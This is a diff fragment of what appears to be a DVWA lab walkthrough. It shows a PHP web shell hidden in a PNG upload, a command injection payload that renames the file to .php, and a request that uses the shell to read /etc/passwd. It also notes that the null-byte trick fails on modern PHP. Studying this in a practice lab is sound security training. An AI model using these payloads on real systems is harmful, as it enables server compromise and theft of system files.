@@ -43,6 +43,7 @@ PNG
 
 <?php system($_GET["cmd"]); ?>
 ------WebKitFormBoundaryeGY91tmcUbjOU5xX
+- Since we can only use null byte (%00) on PHP below 5.3.4, on modern php we cannot simply do filename="dvwa_email.php%00.png". So we must find another method to change the extension to php.
 - Go to command injection section and payload 127.0.0.1|mv ../../hackable/uploads/dvwa_email.png ../../hackable/uploads/dvwa_email.php 
 http://localhost:4280/vulnerabilities/upload/../../hackable/uploads/dvwa_email.php?cmd=cat /etc/passwd
 
